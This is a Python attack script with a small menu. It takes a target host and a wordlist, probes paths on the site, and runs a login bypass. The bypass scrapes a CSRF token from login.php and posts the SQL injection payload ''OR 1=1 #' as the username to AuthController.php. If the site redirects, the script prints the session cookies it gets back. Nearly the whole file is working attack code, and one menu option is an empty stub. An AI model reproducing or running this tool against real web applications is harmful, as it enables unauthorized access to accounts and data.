import requests
from os import system
import getopt
import sys
import pickle
from bs4 import BeautifulSoup

URL =""
WORDLIST = ""
LIST_DIRECTORY=[]

def save_cookies(requests_cookiejar, filename):
    with open(filename, 'wb') as f:
        pickle.dump(requests_cookiejar, f)

def load_cookies(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)

def file_opener():
    global URL,LIST_DIRECTORY
    listDirectory = open(WORDLIST,"r").read().splitlines()
    for i in (listDirectory):
        if(requests.get(URL+"/login.php",i)):
            LIST_DIRECTORY.append(i)

def exploit_sqli():
    datas = {
        'username':"'OR 1=1 #",
        'password':"asdasd",
        'csrf_token':"",
        "login":"Login"
    }
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
    }
    filename = "load"
    r = requests.get(URL+"/login.php",cookies=load_cookies(filename),headers=header)
    soup = BeautifulSoup(r.content,'html5lib')
    # print("Token CSRF: ":)
    datas['csrf_token'] = soup.find('input',attrs={'name':'csrf_token'})['value']
    print("Token CSRF:",datas['csrf_token'])
    print(" ")
    # save_cookies(req.cookies, filename)
    # print(req.content)
    print(" ")
    req = requests.post(URL+"/controllers/AuthController.php",data=datas,cookies=load_cookies(filename),headers=header)
    if(req.is_redirect):
        print("You can Login with this Session: ",req.cookies)
    else:
        print("Failed to Bypass Login!")
    input("")
   
    
def menu():
    global URL,LIST_DIRECTORY
    print("1. Look directory Listing")
    print("2. Look Table [Default will attack sqli in login.php]")
    print("3. Bypass with session")
    choose = int(input("> "))
    if(choose == 1):
        system("clear")
        print("Available Directory")
        for i in LIST_DIRECTORY:
            print(URL+"/"+i)
        input("")
    if(choose == 2):
        pass
    if(choose == 3):
        exploit_sqli()
        

def main():
    global URL,WORDLIST
    system("clear")
    if len(sys.argv) == 1:
        print("Wrong Command Please Use option -H or --host and -W for wordlist")
        return
    options, args = getopt.getopt(sys.argv[1:], "H:W:", ["host=", "wordlist"])
    for opt, arg in options:
        if opt in ('-H', '--host'):
            URL = arg
        if opt in ('-W','--wordlist'):
            WORDLIST = arg
    file_opener()
    while True:
        with requests.session():   
            system("clear")
            menu()
    
    
    

if __name__ == "__main__":
    main()